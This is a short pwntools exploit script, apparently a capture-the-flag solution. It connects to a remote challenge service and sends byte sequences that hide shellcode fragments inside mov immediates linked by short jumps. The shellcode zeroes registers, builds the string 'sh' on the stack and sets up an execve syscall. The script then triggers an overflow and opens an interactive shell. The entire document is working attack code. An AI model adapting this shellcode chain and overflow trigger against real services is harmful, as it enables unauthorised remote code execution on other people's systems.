from pwn import *
# context.update(arch='', os='linux')
# context.terminal = ['tmux', 'splitw', '-h']

# Replace process with remote

p = remote("link", 1337)


# jmp 0xf falls to the next mov instruction + 1, which is the first byte of the imm32

p.send(b"\xBB\x44\x33\x22\x11") # Placeholder, this one is irrelevant
p.send(b"\xBB\x31\xd2\xeb\x0d") # xor edx, edx
p.send(b"\xBB\x31\xf6\xeb\x0d") # xor esi, esi
p.send(b"\xBB\xb0\x73\xeb\x0d") # mov al, 0x73
p.send(b"\xBB\xb4\x68\xeb\x0d") # mov ah, 0x68
p.send(b"\xBB\x50\x54\xeb\x0d") # push rax, push rsp
p.send(b"\xBB\x5f\x90\xeb\x0d") # pop rdi, nop
p.send(b"\xBB\x31\xc0\xeb\x0d") # xor eax. eax
p.send(b"\xBB\xb0\x3b\xeb\x0d") # mov al, 0x3b
p.send(b"\xBB\x0f\x05\xeb\x0d") # syscall


# Above part is the first part of the exploit, which sets up the registers for the execve syscall

p.sendline(b"exit") # Done with the first part, move on to the second part, which has the actual bug
p.sendline(b"33") # Trigger overflow

# Shellcode to do execve(/bin/sh) memory, took and modified: https://www.exploit-db.com/exploits/42179

p.interactive()


